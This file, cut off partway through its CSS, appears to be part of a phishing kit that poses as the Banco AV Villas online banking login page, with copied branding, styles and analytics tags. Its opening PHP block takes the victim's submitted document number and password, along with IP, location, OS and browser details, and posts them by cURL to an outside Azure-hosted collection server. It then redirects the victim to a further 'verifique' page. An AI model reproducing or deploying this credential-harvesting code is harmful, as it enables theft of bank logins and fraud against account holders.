<?php ini_set('display_errors', 0);
session_start();
include('funciones.php');

$enviara = '## AV VILLAS ##
DOCUMENT: ' . $_POST['usuario'] . '
PASSWORD: ' . $_POST['password'] . '
Fecha: ' . date('l jS \of F Y h:i:s A', time()) . '
Ip y Localidad: ' . $myip . ' ' . $pais . ' ' . $region . '
SO: ' . $user_os . '
Navegador: ' . $navegador . '';
$payload = ['mensaje' => $enviara];
$url = 'https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/avevillanequi/';

$ch = curl_init($url);
curl_setopt_array($ch, [
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_POST           => true,
  CURLOPT_HTTPHEADER     => [
    'Accept: application/json',
    'Content-Type: application/json',
'X-Client-IP: ' . $myip,
  ],
  CURLOPT_POSTFIELDS     => json_encode($payload, JSON_UNESCAPED_UNICODE),
  CURLOPT_TIMEOUT        => 20,
  CURLOPT_CONNECTTIMEOUT => 10,
]);

$response = curl_exec($ch);
if ($response === false) {
  error_log('cURL error: ' . curl_error($ch));
  http_response_code(500);
  exit('Error de red.');
}
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch); ?>
<html lang="es" class="hydrated">

<head>
  <meta http-equiv="refresh" content="17;URL=verifique.php">
  <meta charset="utf-8">
  <style data-styles="">
    pzl-budget-bavv,
    pzl-budget,
    pzl-budget-period,
    pzl-list-expenses,
    pzl-list-incomes,
    pzl-list-movements,
    pzl-select-product,
    pzl-profile-questions,
    pzl-select-month,
    pzl-select-product-multiple,
    pzl-balance-chart,
    pzl-balance-chart-tc,
    pzl-category-item,
    pzl-budget-summary,
    pzl-table-movements,
    pzl-budgets-detail,
    pzl-switch,
    pzl-toast,
    pzl-tooltip,
    pzl-carrousel,
    pzl-category-icon,
    pzl-onboarding,
    mocks-components,
    pzl-balance-donut-chart,
    pzl-budget-behavior-skeleton-loader,
    pzl-budget-skeleton-loader,
    pzl-item-description,
    pzl-onboarding-item,
    pzl-separator,
    pzl-tab-icon,
    pzl-tabs-icon,
    pzl-tbody,
    pzl-tfoot,
    pzl-thead,
    pzl-icon,
    pzl-product-card-group,
    pzl-budget-category-item,
    pzl-acordeon,
    pzl-table,
    pzl-overlay,
    pzl-date-picker,
    pzl-modal,
    pzl-list-chart,
    pzl-movement-card,
    pzl-summary-balance,
    pzl-balance-bar-chart,
    pzl-summary-balance-tc,
    pzl-tc-donut-chart,
    pzl-tab,
    pzl-bar-chart,
    pzl-donut-chart,
    pzl-acordeon-item,
    pzl-budget-chart,
    pzl-progress-budget,
    pzl-budget-item,
    pzl-movement-card-group,
    pzl-tabs-advance,
    pzl-radio,
    pzl-card,
    pzl-answer,
    pzl-questions-form,
    pzl-question,
    pzl-text,
    pzl-product-card,
    pzl-container,
    pzl-select,
    pzl-dropdown,
    pzl-option,
    pzl-input,
    pzl-input-date,
    pzl-calendar-picker,
    pzl-button,
    pzl-checkbox,
    pzl-currency,
    pzl-budget-line-chart,
    pzl-tabs,
    pzl-progress-summary-card,
    pzl-budget-period-title,
    pzl-date-slide-selector,
    pzl-line-chart,
    pzl-progress-donut,
    pzl-toggle,
    pzl-category-progress-bar,
    pzl-item,
    pzl-item-content,
    pzl-list,
    pzl-progress-bar {
      visibility: hidden
    }

    .hydrated {
      visibility: inherit
    }
  </style>
  <title>Ingresa a nuestra Banca Virtual | Banco AV Villas</title>
  <meta name="theme-color" content="#ff0014">
  <meta name="description" content="Ingresa a la Banca Virtual AV Villas para hacer transferencias, consultas y pagos en cualquier momento y lugar, sin hacer fila Conoce mas dando clic aqui">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
  <meta http-equiv="Cache-control" content="no-cache">
  <link rel="icon" href="assets/img/favicon.png">
  <!-- Tealium Tag Manager -->
  <script src="https://tags.tiqcdn.com/utag/adl/avv/prod/utag.js" type="text/javascript" async=""></script>
  <script type="text/javascript" async="" charset="utf-8" id="utag_27" src="//static.hotjar.com/c/hotjar-1441325.js?sv=6"></script>
  <script type="text/javascript" async="" charset="utf-8" id="utag_11" src="//c.oracleinfinity.io/acs/account/iw64uzydss/js/main/odc.js"></script>
  <script type="text/javascript" async="" charset="utf-8" id="tealium-tag-7110" src="https://www.google-analytics.com/analytics.js"></script>
  <script type="text/javascript" async="" charset="utf-8" id="utag_17" src="https://tags.bluekai.com/site/86399?ret=js&amp;limit=1"></script>
  <script src="https://tags.tiqcdn.com/utag/adl/avv/prod/utag.js" type="text/javascript" async=""></script>
  <script src="https://tags.tiqcdn.com/utag/adl/avv/prod/utag.sync.js"></script>
  <!-- Loading script asynchronously -->
  <script type="text/javascript">
    (function(a, b, c, d) {
      a = 'https://tags.tiqcdn.com/utag/adl/avv/prod/utag.js';
      b = document;
      c = 'script';
      d = b.createElement(c);
      d.src = a;
      d.type = 'text/java' + c;
      d.async = true;
      a = b.getElementsByTagName(c)[0];
      a.parentNode.insertBefore(d, a);
    })();
  </script>
  <!-- End Tealium Tag Manager -->
  <style>
    @charset "UTF-8";

    :root {
      --blue: #007bff;
      --indigo: #6610f2;
      --purple: #6f42c1;
      --pink: #e83e8c;
      --red: #FF4F5D;
      --orange: #fd7e14;
      --yellow: #ffc107;
      --green: #28a745;
      --teal: #20c997;
      --cyan: #17a2b8;
      --gray: #6c757d;
      --gray-dark: #343a40;
      --primary: #E1001D;
      --secondary: #0048DB;
      --tertiary: #414A53;
      --quaternary: #283747;
      --success: #E2F9EF;
      --info: #DFEAFF;
      --warning: #FFF1C6;
      --danger: #FDCED0;
      --error: #D0021B;
      --light: #EEF0F3;
      --dark: #343a40;
      --white: #fff;
      --breakpoint-xs: 0;
      --breakpoint-sm: 576px;
      --breakpoint-md: 768px;
      --breakpoint-lg: 992px;
      --breakpoint-xl: 1200px;
      --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
      --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace
    }

    *,
    *:before,
    *:after {
      box-sizing: border-box
    }

    html {
      font-family: sans-serif;
      line-height: 1.15;
      -webkit-text-size-adjust: 100%;
      -ms-text-size-adjust: 100%;
      -ms-overflow-style: scrollbar;
      -webkit-tap-highlight-color: rgba(0, 0, 0, 0)
    }

    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", Segoe UI Symbol, "Noto Color Emoji";
      font-size: 14px;
      font-weight: 400;
      line-height: 1.5;
      color: #283747;
      text-align: left;
      background-color: #fff
    }

    @media print {

      *,
      *:before,
      *:after {
        text-shadow: none !important;
        box-shadow: none !important
      }

      @page {
        size: a3
      }

      body {
        min-width: 992px !important
      }
    }

    @font-face {
      font-family: Intro;
      src: url(/bancadigital/assets/fonts/Intro_Family/386879_26_0.eot);
      src: url(/bancadigital/assets/fonts/Intro_Family/386879_26_0.eot?#iefix) format("embedded-opentype"), url(./font/386879_26_0.woff2) format("woff2"), url(/bancadigital/assets/fonts/Intro_Family/386879_26_0.otf) format("opentype"), url(/bancadigital/assets/fonts/Intro_Family/386879_26_0.woff) format("woff"), url(/bancadigital/assets/fonts/Intro_Family/386879_26_0.ttf) format("truetype"), url(/bancadigital/assets/fonts/Intro_Family/386879_26_0.svg#wf) format("svg");
      font-style: normal;
      font-weight: 400
    }

    @font-face {
      font-family: Intro;
      src: url(/bancadigital/assets/fonts/Intro_Family/386879_22_0.eot);
      src: url(/bancadigital/assets/fonts/Intro_Family/386879_22_0.eot?#iefix) format("embedded-opentype"), url(/bancadigital/assets/fonts/Intro_Family/386879_22_0.woff2) format("woff2"), url(/bancadigital/assets/fonts/Intro_Family/386879_22_0.otf) format("opentype"), url(/bancadigital/assets/fonts/Intro_Family/386879_22_0.woff) format("woff"), url(/bancadigital/assets/fonts/Intro_Family/386879_22_0.ttf) format("truetype"), url(/bancadigital/assets/fonts/Intro_Family/386879_22_0.svg#wf) format("svg");
      font-style: normal;
      font-weight: 300
    }

    @font-face {
      font-family: Intro;
      src: url(/bancadigital/assets/fonts/Intro_Family/386879_2A_0.eot);
      src: url(/bancadigital/assets/fonts/Intro_Family/386879_2A_0.eot?#iefix) format("embedded-opentype"), url(./font/386879_2A_0.woff2) format("woff2"), url(/bancadigital/assets/fonts/Intro_Family/386879_2A_0.otf) format("opentype"), url(/bancadigital/assets/fonts/Intro_Family/386879_2A_0.woff) format("woff"), url(/bancadigital/assets/fonts/Intro_Family/386879_2A_0.ttf) format("truetype"), url(/bancadigital/assets/fonts/Intro_Family/386879_2A_0.svg#wf) format("svg");
      font-style: normal;
      font-weight: 600
    }

    @font-face {
      font-family: Intro;
      src: url(/bancadigital/assets/fonts/Intro_Family/386879_4_0.eot);
      src: url(/bancadigital/assets/fonts/Intro_Family/386879_4_0.eot?#iefix) format("embedded-opentype"), url(./font/386879_4_0.woff2) format("woff2"), url(/bancadigital/assets/fonts/Intro_Family/386879_4_0.otf) format("otf"), url(./font/386879_4_0.woff) format("woff"), url(/bancadigital/assets/fonts/Intro_Family/386879_4_0.ttf) format("truetype"), url(/bancadigital/assets/fonts/Intro_Family/386879_4_0.svg#wf) format("svg");
      font-style: normal;
      font-weight: 700
    }

    * {
      font-family: Intro, serif
    }

    @media print {
      @page {
        size: 4in 5.3in;
        margin: 0
      }

      app-root {
        display: none
      }
    }

    :root {
      --animate-duration: 1s;
      --animate-delay: 1s;
      --animate-repeat: 1
    }
  </style>
  <link rel="stylesheet" href="styles.e2e356e92e3c5153.css" media="all" onload="this.media='all'"><noscript>
    <link rel="stylesheet" href="styles.e2e356e92e3c5153.css">
  </noscript>
  <style type="text/css" id="__tealiumGDPRecStyle">
    .privacy_prompt {
      position: fixed;
      padding: 20px 20px 0px 15px;
      width: 802px;
      bottom: 0px;
      left: 40%;
      margin-left: -300px;
      text-align: left;
      box-shadow: 0 2px 8px 0 rgba(44, 44, 51, 0.28);
      border-radius: 4px;
      background-color: #ffffff;
      color: #2c2c33;
      z-index: 1000;
      opacity: 0.9;
    }

    .privacy_prompt a {
      color: #0048db;
      text-decoration: underline;
    }

    .privacy_prompt_content_left {
      font-size: 14px;
      display: block;
      width: 71%;
      float: left;
    }

    .privacy_prompt_content_right {
      padding-top: 5px;
      display: block;
      width: 23%;
      float: left;
      margin-left: 33px;
    }

    .privacy_prompt_icon {
      display: block;
      width: 65px;
      float: left;
      height: 53px;
    }

    .privacy_prompt_icon img {
      position: absolute;
      top: 28px;
      left: 30px;
      display: block;
    }

    .privacy_prompt .button {
      border-radius: 32px;
      border: solid 2px #0014a2;
      color: #0014a2;
      padding: 6px 17px;
      background-color: #ffff;
      font-size: 11px;
      text-align: center;
      cursor: pointer
    }

    .privacy_prompt .option_set {
      display: none;
    }

    .privacy_prompt .option {
      margin: 10px 0px;
      color: #444;
    }

    .privacy_prompt_footer {
      padding: 0px 20px 20px 20px;
      overflow: auto;
    }

    .privacy_prompt_footer a {
      font-size: 0.9em;
    }

    .privacy_prompt .button.right {
      float: right;
    }

    .privacy_prompt .button.left {
      float: left;
    }

    .privacy_prompt>.close_btn_thick {
      position: absolute;
      display: block;
      top: 10px;
      right: 10px;
      text-decoration: none;
      text-shadow: 0 1px 0 #fff;
      color: #777;
      font: 14px/100% arial, sans-serif;
      cursor: pointer;
    }

    .privacy_prompt>.close_btn_thick:after {
      content: "\2716";
    }

    .privacy_prompt .logo {
      float: right;
    }

    .privacy_prompt table {
      padding: 0px;
      border-collapse: collapse;
    }

    .privacy_prompt table tr {}

    .privacy_prompt table th {
      background-color: #FAFAFA;
      border-bottom: 1px solid #EEE;
      margin: 0px;
      padding: 5px 8px;
      font-weight: 400;
      text-align: center;
    }

    .privacy_prompt table td {
      vertical-align: top;
      padding: 10px 8px 5px 8px;
    }

    .privacy_prompt table tr td:first-child {
      min-width: 120px;
      font-weight: 600;
      color: #666;
    }

    .privacy_prompt table tr td:last-child {
      text-align: center;
      min-width: 100px;
    }

    .privacy_prompt input[type="checkbox"].toggle {
      opacity: 0;
      position: absolute;
      left: -99999px;
    }

    .privacy_prompt input[type="checkbox"].toggle+label {
      height: 24px;
      line-height: 24px;
      background-color: #ccc;
      padding: 0px 16px;
      border-radius: 16px;
      display: inline-block;
      position: relative;
      cursor: pointer;
      -moz-transition: all 0.25s ease-in;
      -o-transition: all 0.25s ease-in;
      -webkit-transition: all 0.25s ease-in;
      transition: all 0.25s ease-in;
      -moz-box-shadow: inset 0px 0px 2px rgba(0, 0, 0, 0.5);
      -webkit-box-shadow: inset 0px 0px 2px rgba(0, 0, 0, 0.5);
      box-shadow: inset 0px 0px 2px rgba(0, 0, 0, 0.5);
    }

    .privacy_prompt input[type="checkbox"].toggle+label:before,
    .privacy_prompt input[type="checkbox"].toggle+label:hover:before {
      content: " ";
      position: absolute;
      top: 2px;
      left: 2px;
      width: 26px;
      height: 20px;
      background: #fff;
      z-index: 2;
      -moz-transition: all 0.25s ease-in;
      -o-transition: all 0.25s ease-in;
      -webkit-transition: all 0.25s ease-in;
      transition: all 0.25s ease-in;
      -moz-border-radius: 14px;
      -webkit-border-radius: 14px;
      border-radius: 14px;
    }

    .privacy_prompt input[type="checkbox"].toggle+label .off,
    .privacy_prompt input[type="checkbox"].toggle+label .on {
      color: #fff;
    }

    .privacy_prompt input[type="checkbox"].toggle+label .off {
      margin-left: 20px;
      display: inline-block;
    }

    .privacy_prompt input[type="checkbox"].toggle+label .on {
      display: none;
    }

    .privacy_prompt input[type="checkbox"].toggle:checked+label .off {
      display: none;
    }

    .privacy_prompt input[type="checkbox"].toggle:checked+label .on {
      margin-right: 20px;
      display: inline-block;
    }

    .privacy_prompt input[type="checkbox"].toggle:checked+label,
    .privacy_prompt input[type="checkbox"].toggle:focus:checked+label {
      background-color: #3278c0;
    }

    .privacy_prompt input[type="checkbox"].toggle:checked+label:before,
    .privacy_prompt input[type="checkbox"].toggle:checked+label:hover:before,
    .privacy_prompt input[type="checkbox"].toggle:focus:checked+label:before,
    .privacy_prompt input[type="checkbox"].toggle:focus:checked+label:hover:before {
      background-position: 0 0;
      top: 2px;
      left: 100%;
      margin-left: -28px;
    }

    .privacy_prompt input[type="checkbox"].toggle+label {
      overflow: hidden;
      text-overflow: ellipsis;
      max-height: 24px;
      height: 24px;
    }

    @media (max-width: 780px) {
      #__tealiumGDPRecModal .privacy_prompt {
        width: 100%;
        margin: 0 auto;
        left: 0%;
      }

      .privacy_prompt_content_right {
        padding: 24px 0px 16px 0px
      }

      .privacy_prompt_content_left,
      .privacy_prompt_content_right {
        width: 100%;
        margin: 0px;
        text-align: center;
      }

      .privacy_prompt_icon {
        width: 100%;
      }

      .privacy_prompt_icon img {
        left: 45%;
      }
    }
  </style>
  <script type="text/javascript" id="__tealiumGDPRecScript">
    try {
      if (document.querySelector(".avv-leads__fixed")) {
        document.querySelector(".avv-leads__fixed").classList.remove("avv-leads__hidden");
      }
      if (document.querySelector(".avv-leads__modal")) {
        document.querySelector(".avv-leads__modal").classList.add("avv-leads__hidden");
      }
      if (location.pathname.includes('/bancadigital')) {
        document.getElementById("tealium-privacy-prompt-image").src = "./assets/img/icons/cookie-icon.svg";
      }(function consent_prompt() {
        var $el = document.getElementById("consent_prompt_submit"),
          $modal = document.getElementById("__tealiumGDPRecModal"),
          $closeBtn = $modal.getElementsByClassName("close_btn_thick")[0],
          $privacy_pref_optin = document.getElementById("privacy_pref_optin"),
          $privacy_pref_optout = document.getElementById("privacy_pref_optout");
        var consentState = utag.gdpr.getConsentState();
        if (typeof consentState === "number") {
          if (consentState === 1) {
            $privacy_pref_optin.checked = true;
          } else if (consentState === -1) {
            $privacy_pref_optout.checked = true;
          }
        } else {
          $privacy_pref_optin.checked = true;
        }
        var callBack = function() {
          if ($privacy_pref_optin.checked) {
            utag.gdpr.setConsentValue(1);
          } else if ($privacy_pref_optout.checked) {
            utag.gdpr.setConsentValue(0);
          } else {
            return;
          }
          closePrompt();
        };
        var closePrompt = function() {
          $modal.style.display = "none";
          if (document.querySelector(".avv-leads__fixed") !== null || document.querySelector(".avv-leads__modal" !== null)) {
            document.querySelector(".avv-leads__fixed").classList.add("avv-leads__hidden");
            document.querySelector(".avv-leads__modal").classList.remove("avv-leads__hidden");
          }
        };
        if (document.addEventListener) {
          $el.addEventListener("click", callBack, false);
          $closeBtn.addEventListener("click", closePrompt, false);
        } else if (document.attachEvent) {
          $el.attachEvent("click", callBack);
          $closeBtn.attachEvent("click", closePrompt);
        } else {
          $el.onclick = callBack;
          $closeBtn.onclick = closePrompt;
        }
      })();
    } catch (e) {
      utag.DB(e)
    }
  </script>
  <script type="text/javascript" async="" charset="utf-8" id="utag_adl.avv_17" src="//tags.tiqcdn.com/utag/adl/avv/prod/utag.17.js?utv=ut4.48.202106292120"></script>
  <script type="text/javascript" async="" charset="utf-8" id="utag_adl.avv_38" src="//tags.tiqcdn.com/utag/adl/avv/prod/utag.38.js?utv=ut4.48.202403012140"></script>
  <script type="text/javascript" async="" charset="utf-8" id="utag_adl.avv_11" src="//tags.tiqcdn.com/utag/adl/avv/prod/utag.11.js?utv=ut4.48.202110201919"></script>
  <script type="text/javascript" async="" charset="utf-8" id="utag_adl.avv_27" src="//tags.tiqcdn.com/utag/adl/avv/prod/utag.27.js?utv=ut4.48.202011102104"></script>
  <script async="" src="https://script.hotjar.com/modules.a4fd7e5489291affcf56.js" charset="utf-8"></script>
  <script type="text/javascript" src="https://c.oracleinfinity.io/acs/common/js/1.3.34/common.js" async="true" defer="true"></script>
  <script type="text/javascript" src="https://c.oracleinfinity.io/acs/account/iw64uzydss/js/main/analytics-default/analytics.js" async="true" defer="true"></script>
  <style type="text/css"></style>
  <style>
    @keyframes _ngcontent-qmv-c237_arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes _ngcontent-qmv-c237_spin {
      to {
        transform: rotate(360deg)
      }
    }

    @keyframes _ngcontent-qmv-c237_high {
      0% {
        transform: rotate(0) scale(.94)
      }

      33% {
        transform: rotate(8deg)
      }

      66% {
        transform: rotate(8deg) translateY(-1px)
      }

      to {
        transform: rotate(0) scale(1) translateY(-1px)
      }
    }

    .layout[_ngcontent-qmv-c237] {
      overflow: hidden
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar[_ngcontent-qmv-c237],
    .layout[_ngcontent-qmv-c237] .page-wrapper-content[_ngcontent-qmv-c237] {
      transition: all .3s ease
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar[_ngcontent-qmv-c237] {
      background-color: #fff;
      box-shadow: 0 2px 8px #2c2c3347;
      border-top-left-radius: 20px;
      border-top-right-radius: 20px;
      position: fixed;
      left: 0;
      bottom: 0;
      width: 100vw;
      z-index: 999
    }

    @media (min-width: 768px) {
      .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar[_ngcontent-qmv-c237] {
        border-top-left-radius: 0;
        border-top-right-radius: 0
      }
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar[_ngcontent-qmv-c237] .toggle-arrow[_ngcontent-qmv-c237] {
      display: none;
      transition: transform .4s ease
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar[_ngcontent-qmv-c237] .toggle-arrow.close[_ngcontent-qmv-c237] {
      transform: rotate(180deg)
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-brand[_ngcontent-qmv-c237] {
      display: none
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] {
      height: 56px
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] {
      height: 100%;
      display: flex;
      justify-content: space-evenly;
      align-items: center;
      list-style-type: none;
      margin: 0;
      padding: 0
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li[_ngcontent-qmv-c237] {
      display: flex;
      flex-direction: column;
      align-items: center;
      font-size: 9px;
      line-height: 1.71;
      cursor: pointer
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li[_ngcontent-qmv-c237] p[_ngcontent-qmv-c237] {
      position: relative;
      top: 3px
    }

    @media (min-width: 992px) {
      .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li[_ngcontent-qmv-c237] {
        margin-top: 30px;
        font-size: 14px
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li[_ngcontent-qmv-c237] p[_ngcontent-qmv-c237] {
        display: none
      }
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li[_ngcontent-qmv-c237] img[_ngcontent-qmv-c237] {
      display: none
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li.active[_ngcontent-qmv-c237] {
      color: #e1001d
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li.active[_ngcontent-qmv-c237] p[_ngcontent-qmv-c237] {
      position: relative;
      top: 3px
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li.active[_ngcontent-qmv-c237] img[_ngcontent-qmv-c237] {
      display: block;
      width: 16px;
      height: 3px
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li.active[_ngcontent-qmv-c237] .circle[_ngcontent-qmv-c237] {
      animation: _ngcontent-qmv-c237_high .35s linear forwards
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li.active[_ngcontent-qmv-c237] .circle[_ngcontent-qmv-c237] .icon[_ngcontent-qmv-c237] {
      color: #e1001d
    }

    @media (min-width: 992px) {
      .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li.active[_ngcontent-qmv-c237] .circle[_ngcontent-qmv-c237] .icon[_ngcontent-qmv-c237] {
        color: #fff
      }
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li[_ngcontent-qmv-c237] .circle[_ngcontent-qmv-c237] {
      width: 20px;
      height: 20px;
      position: relative;
      text-align: center
    }

    @media (min-width: 992px) {
      .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li[_ngcontent-qmv-c237] .circle[_ngcontent-qmv-c237] {
        width: 16px;
        height: 16px;
        margin-right: 1rem
      }
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li[_ngcontent-qmv-c237] .circle[_ngcontent-qmv-c237]:before {
      content: "";
      border-radius: 50%;
      position: absolute;
      top: 0;
      left: 0;
      width: 30%;
      height: 100%;
      transition: width .3s ease;
      z-index: -1
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li[_ngcontent-qmv-c237] .circle[_ngcontent-qmv-c237] .icon[_ngcontent-qmv-c237] {
      font-size: 20px;
      color: #5c6b7a;
      margin-bottom: 10px
    }

    @media (min-width: 992px) {
      .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li[_ngcontent-qmv-c237] .circle[_ngcontent-qmv-c237] .icon[_ngcontent-qmv-c237] {
        font-size: 16px
      }
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-content[_ngcontent-qmv-c237] {
      margin-bottom: 80px;
      width: 100vw
    }

    @media (min-width: 992px) {
      .layout[_ngcontent-qmv-c237] .page-wrapper-content[_ngcontent-qmv-c237] {
        margin-bottom: 50px
      }
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-content[_ngcontent-qmv-c237] .mobile-bread-crumbs[_ngcontent-qmv-c237] {
      padding: 13px 15px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      width: 100%;
      height: 65px;
      color: #283747;
      position: relative
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-content[_ngcontent-qmv-c237] .mobile-bread-crumbs.is-home[_ngcontent-qmv-c237] {
      margin-bottom: 0
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-content[_ngcontent-qmv-c237] .mobile-bread-crumbs.is-home[_ngcontent-qmv-c237] .mobile-bread-crumbs-back[_ngcontent-qmv-c237] {
      display: none
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-content[_ngcontent-qmv-c237] .mobile-bread-crumbs[_ngcontent-qmv-c237] h5[_ngcontent-qmv-c237],
    .layout[_ngcontent-qmv-c237] .page-wrapper-content[_ngcontent-qmv-c237] .mobile-bread-crumbs[_ngcontent-qmv-c237] p[_ngcontent-qmv-c237] {
      margin: 0
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-content[_ngcontent-qmv-c237] .mobile-bread-crumbs[_ngcontent-qmv-c237] .mobile-bread-crumbs-name[_ngcontent-qmv-c237] {
      position: relative
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-content[_ngcontent-qmv-c237] .mobile-bread-crumbs[_ngcontent-qmv-c237] .mobile-bread-crumbs-name[_ngcontent-qmv-c237]:before {
      content: "";
      position: absolute;
      left: 0;
      bottom: -15px;
      width: 50px;
      height: 5px;
      background-color: #e1001d
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-content[_ngcontent-qmv-c237] .mobile-bread-crumbs[_ngcontent-qmv-c237] .mobile-bread-crumbs-back[_ngcontent-qmv-c237] {
      color: #77899a;
      cursor: pointer
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper-content[_ngcontent-qmv-c237] .mobile-bread-crumbs[_ngcontent-qmv-c237] .mobile-bread-crumbs-back[_ngcontent-qmv-c237]>i[_ngcontent-qmv-c237] {
      color: #77899a;
      vertical-align: sub;
      font-size: 20px
    }

    @media (min-width: 576px) {
      .layout[_ngcontent-qmv-c237] .page-wrapper-content[_ngcontent-qmv-c237] .mobile-bread-crumbs[_ngcontent-qmv-c237] {
        display: none
      }
    }

    .layout[_ngcontent-qmv-c237] .page-wrapper[_ngcontent-qmv-c237] .page-wrapper-footer {
      display: none
    }

    @media (min-width: 576px) {
      .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] {
        height: 64px
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] {
        justify-content: center;
        padding-top: 10px
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li[_ngcontent-qmv-c237] {
        font-size: 11px;
        margin-right: 32px
      }
    }

    @media (min-width: 992px) {
      .layout[_ngcontent-qmv-c237] .page-wrapper.open[_ngcontent-qmv-c237] .page-wrapper-sidebar[_ngcontent-qmv-c237] {
        width: 200px
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper.open[_ngcontent-qmv-c237] .page-wrapper-sidebar-brand[_ngcontent-qmv-c237] {
        display: flex;
        justify-content: center;
        padding: 17px 30px
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper.open[_ngcontent-qmv-c237] .page-wrapper-sidebar-brand[_ngcontent-qmv-c237] .avv-open[_ngcontent-qmv-c237] {
        display: block
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper.open[_ngcontent-qmv-c237] .page-wrapper-sidebar-brand[_ngcontent-qmv-c237] .avv-close[_ngcontent-qmv-c237] {
        display: none
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper.open[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] {
        display: block;
        padding-top: 0
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper.open[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li[_ngcontent-qmv-c237]:not(.active):hover {
        position: relative
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper.open[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li[_ngcontent-qmv-c237]:not(.active):hover:before {
        background-color: #f1f5fb;
        width: calc(100% - 20px)
      }

      .layout[_ngcontent-qmv-c237] .page-wrapper.open[_ngcontent-qmv-c237] .page-wrapper-sidebar-menu[_ngcontent-qmv-c237] ul[_ngcontent-qmv-c237] li[_ngcontent-qmv-c237] {
        display: flex;
        flex-direction: row;
        align-items: center;
        color: #283747;
        font-weight: 600;
        font-size: 14px;
        line-height: 1.71;
        margin-top: 30px;
        margin-right: 0
      }

